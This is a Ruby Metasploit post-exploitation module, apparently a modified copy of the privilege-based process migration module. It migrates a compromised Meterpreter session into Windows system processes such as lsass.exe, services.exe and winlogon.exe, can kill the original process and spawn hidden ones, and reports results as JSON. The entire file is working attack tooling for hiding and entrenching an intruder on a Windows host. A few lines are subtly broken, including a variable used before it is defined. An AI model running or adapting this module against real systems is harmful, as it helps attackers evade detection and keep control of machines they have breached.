##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'yajl'
class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv

  DEFAULT_ADMIN_TARGETS = ['svchost.exe', 'lsm.exe', 'lsass.exe', 'winlogon.exe','services.exe', 'wininit.exe']
  DEFAULT_USER_TARGETS  = ['explorer.exe', 'notepad.exe']

  def initialize(info = {})
    super(update_info(info,
                      'Name'         => 'Windows Manage Privilege Based Process Migration ',
                      'Description'  => %q{ This module will migrate a Meterpreter session based on session privileges.
         It will do everything it can to migrate, including spawning a new User level process.
         For sessions with Admin rights: It will try to migrate into a System level process in the following
         order: ANAME (if specified), services.exe, wininit.exe, svchost.exe, lsm.exe, lsass.exe, and winlogon.exe.
         If all these fail and NOFAIL is set to true, it will fall back to User level migration. For sessions with User level rights:
         It will try to migrate to a user level process, if that fails it will attempt to spawn the process
         then migrate to it. It will attempt the User level processes in the following order:
         NAME (if specified), explorer.exe, then notepad.exe.},
                      'License'      => MSF_LICENSE,
                      'Author'       =>
                              [
                                      'Josh Hale "sn0wfa11" <jhale85446[at]gmail.com>',
                                      'theLightCosine'
                              ],
                      'Platform'     => ['win'],
                      'SessionTypes' => ['meterpreter']
          ))

    register_options(
            [
                    OptString.new('ANAME', [false, 'System process to migrate to. For sessions with Admin rights. (See Module Description.)']),
                    OptString.new('NAME', [false, 'Process to migrate to. For sessions with User rights. (See Module Description.)']),
                    OptBool.new('KILL', [true, 'Kill original session process.', false]),
                    OptBool.new('NOFAIL', [true, 'Migrate to user level process if Admin migration fails. May downgrade privileged shells.', true]),
                    OptInt.new('MIGRATE_TIMEOUT', [false, 'timeout for one migrate.', 120]),
            ])
  end

  def run
    @result = {:status => true, :message => nil, :data => nil, :endflag => nil}
    if session.type == "shell"
      @result = {:status => false, :message => 'Unsupport shell type', :data => nil}
      json    = Yajl::Encoder.encode(result).encode('UTF-8', :invalid => :replace, :replace => "?")
      print("#{json}")
      return
    end

    # Populate target array and Downcase all Targets
    admin_targets = DEFAULT_ADMIN_TARGETS.dup
    admin_targets.unshift(datastore['ANAME']) if datastore['ANAME']
    admin_targets.map!(&:downcase)
    vprint_status("module start")

    # Get current process information
    @original_pid  = client.sys.process.open.pid
    @original_name = client.sys.process.open.name.downcase
    vprint_status("Current session process is #{@original_name} (#{@original_pid}) as: #{client.sys.config.getuid}")

    if is_system?
      vprint_status("Session is already Admin and System.")
      if admin_targets.include? @original_name
        vprint_good("Session is already in target process: #{@original_name}.")
        result = {:status => true, :message => nil, :data => {:pid => @original_pid, :pname => @original_name}}
        json   = Yajl::Encoder.encode(result).encode('UTF-8', :invalid => :replace, :replace => "?")
        print("#{json}")
        return
      end
    else
      vprint_status("Session is Admin but not System.")
    end

    if is_admin?
      vprint_status("Will attempt to migrate to specified System level process.")
      # Try to migrate to each of the System level processes in the list.  Stop when one works.  Go to User level migration if none work.
      admin_targets.each do |target_name|
        flag, target_pid = migrate(get_pid(target_name), target_name, @original_pid)
        if flag
          client.update_session_info
          kill(@original_pid, @original_name)
          result = {:status => true, :message => nil, :data => {:pid => target_pid, :pname => target_name}}
          json   = Yajl::Encoder.encode(result).encode('UTF-8', :invalid => :replace, :replace => "?")
          print("#{json}")
          return
        end
      end
    end
    result = {:status => false, :message => nil, :data => nil}
    json   = Yajl::Encoder.encode(result).encode('UTF-8', :invalid => :replace, :replace => "?")
    print("#{json}")
    # if datastore['NOFAIL']
    #   # Populate Target Array and Downcase all Targets
    #   user_targets = DEFAULT_USER_TARGETS.dup
    #   user_targets.unshift(datastore['NAME']) if datastore['NAME']
    #   user_targets.map!(&:downcase)
    #
    #   vprint_status("Will attempt to migrate to a User level process.")
    #
    #   # Try to migrate to user level processes in the list.  If it does not exist or cannot migrate, try spawning it then migrating.
    #   user_targets.each do |target_name|
    #     flag, target_pid = migrate(get_pid(target_name), target_name, @original_pid)
    #     if flag
    #       result = {:status => true, :message => nil, :data => {:pid => target_pid, :pname => target_name}}
    #       json   = Yajl::Encoder.encode(result).encode('UTF-8', :invalid => :replace, :replace => "?")
    #       print("#{json}")
    #       return
    #     end
    #     flag, target_pid = migrate(spawn(target_name), target_name, @original_pid)
    #     if flag
    #       result = {:status => true, :message => nil, :data => {:pid => target_pid, :pname => target_name}}
    #       json   = Yajl::Encoder.encode(result).encode('UTF-8', :invalid => :replace, :replace => "?")
    #       print("#{json}")
    #       return
    #     end
    #   end
    #   result = {:status => false, :message => nil, :data => nil}
    #   json   = Yajl::Encoder.encode(result).encode('UTF-8', :invalid => :replace, :replace => "?")
    #   print("#{json}")
    # end

  end

  # This function returns the first process id of a process with the name provided.
  # It will make sure that the process has a visible user meaning that the session has rights to that process.
  # Note: "target_pid = session.sys.process[proc_name]" will not work when "include Msf::Post::Windows::Priv" is in the module.
  #
  # @return [Integer] the PID if one is found
  # @return [NilClass] if no PID was found
  def get_pid(proc_name)
    processes = client.sys.process.get_processes
    processes.each do |proc|
      if proc['name'].downcase == proc_name && proc['user'] != ""
        return proc['pid']
      end
    end
    return nil
  end

  # This function will try to kill the original session process
  #
  # @return [void] A useful return value is not expected here
  def kill(proc_pid, proc_name)
    if datastore['KILL']
      begin
        vprint_status("Trying to kill original process #{proc_name} (#{proc_pid})")
        session.sys.process.kill(proc_pid)
        vprint_good("Successfully killed process #{proc_name} (#{proc_pid})")
      rescue ::Rex::Post::Meterpreter::RequestError => error
        vprint_error("Could not kill original process #{proc_name} (#{proc_pid})")
        vprint_error(error.to_s)
      end
    end
  end

  # This function attempts to migrate to the specified process.
  #
  # @return [TrueClass] if it successfully migrated
  # @return [FalseClass] if it failed to migrate
  def migrate(target_pid, proc_name, current_pid)
    if !target_pid
      vprint_error("Could not migrate to #{proc_name}.")
      return false, nil
    end

    vprint_status("Trying #{proc_name} (#{target_pid})")

    if target_pid == current_pid
      vprint_good("Already in #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
      return true, target_pid
    end
    to = (datastore['MIGRATE_TIMEOUT'].zero?) ? nil : datastore['MIGRATE_TIMEOUT']
    begin
      flag = client.core.migrate(target_pid, opts = {:timeout => to})
      # vprint_good("Successfully migrated to #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
      return flag, target_pid
    rescue Exception => e
      vprint_error("migrate failed on #{e}")
      return false, nil
    rescue ::Rex::Post::Meterpreter::RequestError => req_error
      vprint_error("Could not migrate to #{proc_name}.")
      vprint_error(req_error.to_s)
      return false, nil
    rescue ::Rex::RuntimeError => run_error
      vprint_error("Could not migrate to #{proc_name}.")
      vprint_error(run_error.to_s)
      return false, nil
    end
  end


  # This function will attempt to spawn a new process of the type provided by the name.
  #
  # @return [Integer] the PID if the process spawned successfully
  # @return [NilClass] if the spawn failed
  def spawn(proc_name)
    begin
      to = (datastore['MIGRATE_TIMEOUT'].zero?) ? nil : datastore['MIGRATE_TIMEOUT']
      print_status("Attempting to spawn #{proc_name}")
      ::Timeout.timeout(to) do
        proc = session.sys.process.execute(proc_name, nil, {'Hidden' => true})
      end
      vprint_good("Successfully spawned #{proc_name}")
      return proc.pid
    rescue ::Rex::Post::Meterpreter::RequestError => error
      vprint_error("Could not spawn #{proc_name}.")
      vprint_error(error.to_s)
      return nil
    rescue ::Timeout::Error
      vprint_error("Timed out after #{to} seconds. Skipping...")
      return false
    end
  end
end

